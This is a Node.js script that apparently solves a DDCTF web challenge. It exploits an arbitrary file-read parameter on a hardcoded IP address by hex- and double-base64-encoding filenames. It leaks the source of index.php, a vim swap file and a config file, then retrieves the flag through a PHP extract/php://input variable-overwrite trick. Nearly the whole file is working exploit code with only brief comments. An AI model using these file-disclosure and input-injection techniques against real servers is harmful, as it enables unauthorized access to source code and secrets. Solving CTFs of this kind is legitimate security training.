const got = require('got')
const cheerio = require('cheerio')
const { base64 } = require('../common/utils')

function encode (input) {
  let hex = Buffer.from(input).toString('hex')
  return base64.encode(base64.encode(hex))
}

async function fetch (filename) {
  const url = `http://117.51.150.246/index.php?jpg=${encode(filename)}`
  const { body } = await got(url)
  const $ = cheerio.load(body)
  return {
    filename,
    content: base64.decode($('img').attr('src').slice('data:image/gif;base64,'.length) || ''),
  }
}

/**
 * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#extract
 * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_3
 */
async function getFlag () {
  const url = `http://117.51.150.246/f1ag!ddctf.php?uid=yelo&k=php://input`
  const { body } = await got.post(url, {
    body: 'yelo',
  })
  return body
}

;(async () => {
  try {
    console.log('Step1: ---')
    console.log((await fetch('index.php')).content)
    console.log('Step2: ---')
    console.log('[ Scan file with ./scan.js manually ]')
    console.log('Step3: ---')
    console.log((await fetch('practice.txt.swp')).content)
    console.log('Step4: ---')
    console.log((await fetch('f1agconfigddctf.php')).content)
    console.log('Step5: ---')
    console.log(await getFlag())
    console.log('Bonus: ---')
    console.log(Buffer.from('436f6e67726174756c6174696f6e73', 'hex').toString()) // Congratulations
  } catch (error) {
    console.error(`Error: ${error.message}`)
  }
})()
